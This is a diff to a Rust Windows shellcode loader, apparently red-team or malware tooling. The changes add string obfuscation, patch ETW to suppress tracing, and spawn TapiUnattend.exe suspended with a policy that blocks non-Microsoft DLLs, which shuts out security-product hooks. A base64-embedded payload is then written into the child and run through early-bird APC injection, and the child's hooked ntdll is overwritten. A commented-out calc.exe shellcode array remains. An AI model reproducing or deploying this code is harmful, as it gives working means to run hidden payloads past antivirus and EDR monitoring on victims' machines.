@@ -1,9 +1,17 @@
-use std::{ptr::{null_mut, null}, mem::transmute, collections::BTreeMap, ffi::{CStr, CString, c_void}, ops::Add, fs::File, io::Read};
+use std::{ptr::{null_mut, null}, mem::transmute, mem::size_of, collections::BTreeMap, ffi::{CStr, CString, c_void}, ops::Add, fs::File, io::Read};
 
+use obfstr::obfstr as obf;
 use base64::decode;
 use ntapi::{
     ntpebteb::{PPEB},
-    ntpsapi::{PPEB_LDR_DATA},
+    ntpsapi::{
+        NtQueueApcThreadEx,
+        PPS_APC_ROUTINE,
+        NtResumeThread,
+        NtTestAlert,
+        NtCurrentThread,
+        PPEB_LDR_DATA
+    },
     ntldr::{PLDR_DATA_TABLE_ENTRY}
 };
 
@@ -24,10 +32,28 @@ use winapi::{
             CreateProcessA ,
             OpenProcess,
             PROCESS_INFORMATION,
+            PPROC_THREAD_ATTRIBUTE_LIST,
             STARTUPINFOA,
-            TerminateProcess
+            TerminateProcess,
+            InitializeProcThreadAttributeList,
+            UpdateProcThreadAttribute
+        },
+        winbase::{
+            STARTUPINFOEXA,
+            EXTENDED_STARTUPINFO_PRESENT,
+            CREATE_SUSPENDED,
+            CREATE_NO_WINDOW
+        },
+        heapapi::{
+            GetProcessHeap,
+            HeapAlloc,
+            HeapFree
+        },
+        memoryapi::{
+            VirtualAllocExNuma
         },
         winnt::{
+            HEAP_ZERO_MEMORY,
             IMAGE_DOS_HEADER,
             IMAGE_NT_HEADERS64,
             IMAGE_SECTION_HEADER,
@@ -37,6 +63,7 @@ use winapi::{
             PAGE_READWRITE,
             PAGE_EXECUTE_READWRITE,
             MEM_RESERVE,
+            PAGE_EXECUTE,
             PAGE_EXECUTE_READ,
             MAXIMUM_ALLOWED
         }
@@ -48,10 +75,14 @@ use winapi::{
             ULONG,
             PULONG,
             LPCSTR,
+            NT_SUCCESS,
             NTSTATUS
         },
     },
 };
+
+const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON:usize = 0x00000001 << 44;
+const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY:usize = 0x00020007;
 
 const PEBOFFSET: u64 = 0x60;
 
@@ -231,9 +262,9 @@ unsafe fn get_module_export_lists(module_base: PVOID) -> BTreeMap<String, usize>
     return result
 }
 
-unsafe fn patch_etw(nt_funcs: BTreeMap<String, usize>, k32_funcs: BTreeMap<String, usize>) -> bool {
+unsafe fn patch_etw(hprocess: HANDLE, nt_funcs: BTreeMap<String, usize>, k32_funcs: BTreeMap<String, usize>) -> bool {
     let written = null_mut() as PVOID;
-    let nt_trace_ptr = nt_funcs.get("NtTraceControl").unwrap();
+    let nt_trace_ptr = nt_funcs.get(obf!("NtTraceControl")).unwrap();
     let mut base_address = *nt_trace_ptr as *mut c_void;
 
     println!("[+] NtTraceControl addr {:x?}", nt_trace_ptr);
@@ -242,8 +273,8 @@ unsafe fn patch_etw(nt_funcs: BTreeMap<String, usize>, k32_funcs: BTreeMap<Strin
 
     // __breakpoint();
 
-    let res = transmute::<_, WriteProcessMemory>(*k32_funcs.get("WriteProcessMemory").expect("OOOPS"))(
-        0xffffffffffffffff as HANDLE,
+    let res = transmute::<_, WriteProcessMemory>(*k32_funcs.get(obf!("WriteProcessMemory")).expect("OOOPS"))(
+        hprocess,
         *nt_trace_ptr as PVOID,
         patch.as_ptr() as PVOID,
         patch.len() as PVOID,
@@ -254,11 +285,11 @@ unsafe fn patch_etw(nt_funcs: BTreeMap<String, usize>, k32_funcs: BTreeMap<Strin
 
 
 fn main() {
-    let mut ntdll_addr = unsafe { get_module_addr_by_name("ntdll.dll") };
+    let mut ntdll_addr = unsafe { get_module_addr_by_name(obf!("ntdll.dll")) };
     println!("[+] NTDLL ptr: {:x?}", ntdll_addr);
     assert_ne!(ntdll_addr as usize, 0);
 
-    let mut kernel32_addr = unsafe { get_module_addr_by_name("kernel32.dll") };
+    let mut kernel32_addr = unsafe { get_module_addr_by_name(obf!("kernel32.dll")) };
     println!("[+] Kernel32 ptr: {:x?}", kernel32_addr);
     assert_ne!(kernel32_addr as usize, 0);
 
@@ -274,21 +305,71 @@ fn main() {
         // println!("[+] Function: {} ({:x?})", name, addr as PVOID);
     }
 
+    unsafe {
+        let patch_res = patch_etw(0xffffffffffffffff as HANDLE,nt_functions.to_owned(), k32_functions.to_owned());
+        if patch_res != true {
+            println!("[-] ETW failed to patch: {}", patch_res)
+        }
+    }
+
     let process_name = r"C:\Windows\System32\TapiUnattend.exe";
     let lp_command_line = CString::new(process_name).unwrap().into_raw() as _;
-    let mut startup_info = unsafe { std::mem::zeroed::<STARTUPINFOA>() };
-    let mut process_information = unsafe { std::mem::zeroed::<PROCESS_INFORMATION>() };
+
+    // let mut startup_info = unsafe { std::mem::zeroed::<STARTUPINFOA>() };
+    // let mut process_information = unsafe { std::mem::zeroed::<PROCESS_INFORMATION>() };
+
+    let mut process_information:PROCESS_INFORMATION = PROCESS_INFORMATION::default();
+    let mut si:STARTUPINFOEXA = STARTUPINFOEXA::default();
+    let mut allocstart : *mut c_void = null_mut();
+
+    let mut attributesize: usize =0;
+    println!("[+] Now setting up the new process policy");
+    let mut status;
+    unsafe {
+        status = InitializeProcThreadAttributeList(null_mut(),1,0, &mut attributesize);
+        println!("[+] InitializeProcThreadAttributeList result: {:x}", status as usize);
+        si.lpAttributeList= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,attributesize) as PPROC_THREAD_ATTRIBUTE_LIST;
+        status = InitializeProcThreadAttributeList(si.lpAttributeList,1,0, &mut attributesize);
+        println!("[+] InitializeProcThreadAttributeList result: {:x}", status as usize);
+
+        let mut policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON as usize;
+        println!("[+] Policy: {:x}", policy as usize);
+
+        let mut result = UpdateProcThreadAttribute(
+            si.lpAttributeList,
+            0,
+            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+            policy as *mut c_void,
+            size_of::<usize>(),
+            null_mut(),
+            null_mut()
+        );
+        println!("[+] UpdateProcThreadAttribute (Policy) result: {:x}", result);
+        // let mut openproc: HANDLE = OpenProcess(0x02000000, 0, 2388);
+        // println!("[+] OpenProc handle: {:X}", openproc as usize);
+        // result = UpdateProcThreadAttribute(
+        //     si.lpAttributeList,
+        //     0,
+        //     0 | 0x00020000,
+        //     (&mut openproc) as *mut *mut c_void as *mut c_void,
+        //     size_of::<HANDLE>(),
+        //     null_mut(),
+        //     null_mut()
+        // );
+        // println!("[+] UpdateProcThreadAttribute (PPID) result: {:x}", result);
+    }
+
     let create_process_result = unsafe {
         CreateProcessA(
             null_mut(),
             lp_command_line,
             null_mut(),
             null_mut(),
-            0,
+            EXTENDED_STARTUPINFO_PRESENT as i32,
             0x00000004,
             null_mut(),
             null_mut(),
-            &mut startup_info,
+            &mut si.StartupInfo,
             &mut process_information,
         )
     };
@@ -305,7 +386,7 @@ fn main() {
     )};
     let psapi_functions = unsafe { get_module_export_lists(psapi) };
 
-    // let mut buf: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
+    // let mut buffer: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
     //     0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
     //     0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
     //     0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
@@ -329,29 +410,13 @@ fn main() {
     //     0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
     //     0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
     //     0x2e,0x65,0x78,0x65,0x00];
-    // println!("[+] Buf Ptr {:x?}", buf.as_mut_ptr() as PVOID);
-
-    // let mut file_contents = include_bytes!("loader.bin").to_vec();
+    // println!("[+] Buf Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
  
     let my_str = include_str!("loader.b64");
     let mut file_contents = decode(my_str).expect("Failed to load load");
-
-    // let mut file = File::open("C://load.z").unwrap();
-    // let mut file_contents = Vec::new();
-    // file.read_to_end(&mut file_contents).unwrap();
     let sss = file_contents.len();
     let mut buffer = file_contents.into_boxed_slice();
     println!("[+] Buf2 Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
-
-    // let mut file_contents  = Asset::get("loader.bin").unwrap().data.to_vec();
-    // let sss = file_contents.len();
-    // let mut buffer = file_contents.into_boxed_slice();
-
-    // println!("[+] Buf2 Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
-
-    // __breakpoint();
-
-    // let mut aa = include_bytes!("loader.bin").to_vec();
 
     let nt_avm_addr = nt_functions.get("NtAllocateVirtualMemory").unwrap();
     println!("[+] NtAllocateVitualMemory function address {:x?}", nt_avm_addr);
@@ -365,13 +430,13 @@ fn main() {
     // println!("[+] NtCreateThreadEx function address {:x?}", nt_cte_addr);
     // let nt_wvm = unsafe { transmute::<_, NtWriteVirtualMemory>(*nt_wvm_addr) };
 
-    let terminated = unsafe { TerminateProcess(process_information.hProcess, 101) };
+    // let terminated = unsafe { TerminateProcess(process_information.hProcess, 101) };
 
     unsafe { 
-        let patch_res = patch_etw(nt_functions.to_owned(), k32_functions.to_owned());
-        if patch_res != true {
-            println!("[-] Status: {}", patch_res)
-        }
+        // let patch_res = patch_etw(0xffffffffffffffff as HANDLE,nt_functions.to_owned(), k32_functions.to_owned());
+        // if patch_res != true {
+        //     println!("[-] Status: {}", patch_res)
+        // }
 
         let mut size = buffer.len() as usize;
         println!("[+] Buf Size {}", buffer.len());
@@ -382,15 +447,29 @@ fn main() {
             0,
             &mut size,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            PAGE_READWRITE
         );
         if status != 0 {
             println!("[-] NTSTATUS: {:x}", status)
         }
         println!("[+] NtAllocateVitualMemory Base address {:x?}", base_address);
+
+
+        // we overwrite base_address with heap in target proc
+        HeapFree(GetProcessHeap(),HEAP_ZERO_MEMORY,std::mem::transmute(si.lpAttributeList));
+        base_address = VirtualAllocExNuma(
+            process_information.hProcess,
+            null_mut(),
+            buffer.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,0
+        );
+        println!("[+] VirtualAllocExNuma Base address {:x?}", base_address);
+
         let bytes_written = null_mut() as PVOID;
         let status = transmute::<_, NtWriteVirtualMemory>(*nt_functions.get("NtWriteVirtualMemory").expect("OOOPS"))(
-            0xffffffffffffffff as HANDLE,
+            // 0xffffffffffffffff as HANDLE,
+            process_information.hProcess as HANDLE,
             base_address,
             buffer.as_mut_ptr() as PVOID,
             buffer.len() as PVOID,
@@ -432,30 +511,106 @@ fn main() {
     
         let mut old_protect = null_mut() as PVOID;
         let status = transmute::<_, NtProtectVirtualMemory>(*nt_functions.get("NtProtectVirtualMemory").expect("OOOPS"))(
-            0xffffffffffffffff as HANDLE,
+            // 0xffffffffffffffff as HANDLE,
+            process_information.hProcess as HANDLE,
             &base_address,
             &buffer.len(),
-            PAGE_EXECUTE_READ,
+            PAGE_EXECUTE,
             &mut old_protect
         );
         if status != 0 {
             println!("[-] NTSTATUS: {:x}", status)
         }
 
-        let mut old_protect = null_mut() as PVOID;
-        let status = transmute::<_, EnumPageFilesW>(*psapi_functions.get("EnumPageFilesW").expect("OOOPS"))(
-            base_address,
-            0
-        );
-        if !status {
-            println!("[-] EnumPageFilesW failed");
-        }
+        // let mut old_protect = null_mut() as PVOID;
+        // let status = transmute::<_, EnumPageFilesW>(*psapi_functions.get("EnumPageFilesW").expect("OOOPS"))(
+        //     base_address,
+        //     0
+        // );
+        // if !status {
+        //     println!("[-] EnumPageFilesW failed");
+        // }
 
+        let mut apc = NtQueueApcThreadEx(
+            // NtCurrentThread,
+            process_information.hThread,
+            null_mut(),
+            Some(transmute(base_address)) as PPS_APC_ROUTINE,
+            base_address,
+            null_mut(),
+            null_mut()
+        );
+        if !NT_SUCCESS(apc) {
+            println!("Well shit {:x}", apc);
+        }
+        apc = NtResumeThread(process_information.hThread, &mut 0);
+        // wait a bit here?
+        println!("[+] Now writing NTDLL .text back to child process since it might be hooked now");
+        copy_local_ntdll_to_remote_ntdll_text_section(ntdll_addr, kernel32_addr, ".text", process_information.hProcess as isize, k32_functions, nt_functions.to_owned());
     };
 
     // status = NtAllocateVirtualMemory(handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 }
+
+unsafe fn copy_local_ntdll_to_remote_ntdll_text_section(ntdll_addr: PVOID, kernel32_addr: PVOID,
+        section: &str, proc_handle: isize, k32_functions: BTreeMap<String, usize>, nt_fucntions: BTreeMap<String, usize>) {
+    let text_section = unsafe { get_module_section_addr(ntdll_addr, ".text") };
+    assert_ne!(text_section as usize, 0);
+    println!("[+] .text section addr: {:x?}", text_section);
+
+    let vaddr = ntdll_addr as usize + (*text_section).VirtualAddress as usize;
+    println!("[+] VirtualAddress (destination): {:x?}", vaddr as PVOID);
+
+    let size = (*text_section).SizeOfRawData as usize;
+    println!("[+] RawData size (source size): {}", size);
+
+    // Create empty Vec buffer of bytes
+    let mut ntdll_text_section_buffer: Vec<u8> = Vec::with_capacity(size as usize);
+    println!("[+] NTDLL section buffer ptr: {:p}", ntdll_text_section_buffer.as_mut_ptr() as PVOID);
+
+    let rpm_addr = k32_functions.get("ReadProcessMemory").unwrap();
+    println!("[+] ReadProcessMemory Function ptr: {:x?}", rpm_addr);
+
+    let wpm_addr = k32_functions.get("WriteProcessMemory").unwrap();
+    println!("[+] WriteProcessMemory Function ptr: {:x?}", wpm_addr);
+
+    let rpm = 
+        unsafe { transmute::<_, ReadProcessMemory>(*rpm_addr) };
+
+    let wpm = 
+        unsafe { transmute::<_, WriteProcessMemory>(*wpm_addr) };
+
+    let bytes_read = null_mut() as PVOID;
+    let bytes_written = null_mut() as PVOID;
+
+    // unsafe { __breakpoint() };
+    // pause();
+
+    let mut res = rpm(
+        0xffffffffffffffff as HANDLE,
+        vaddr as PVOID,
+        ntdll_text_section_buffer.as_mut_ptr() as _,
+        size as PVOID,
+        &bytes_read
+    );
+    let slice = core::slice::from_raw_parts(ntdll_text_section_buffer.as_mut_ptr(), 20);
+    for b in slice{
+        print!("{:X?} ", b)
+    }
+    assert_eq!(res, true);
+    println!();
+    println!("[+] Bytes read to {:x?}: {}", ntdll_text_section_buffer.as_mut_ptr(), bytes_read as usize);
+
+    // __breakpoint();
+
+    res = wpm(proc_handle as HANDLE, vaddr as PVOID, ntdll_text_section_buffer.as_mut_ptr() as PVOID, size as PVOID, &bytes_written);
+    assert_eq!(res, true);
+    println!("[+] Bytes written: {}", bytes_written as usize);
+
+
+}
+
 
 unsafe fn copy_remote_ntdll_to_local_ntdll_text_section(ntdll_addr: PVOID, kernel32_addr: PVOID,
         section: &str, proc_handle: isize, k32_functions: BTreeMap<String, usize>, nt_fucntions: BTreeMap<String, usize>) {
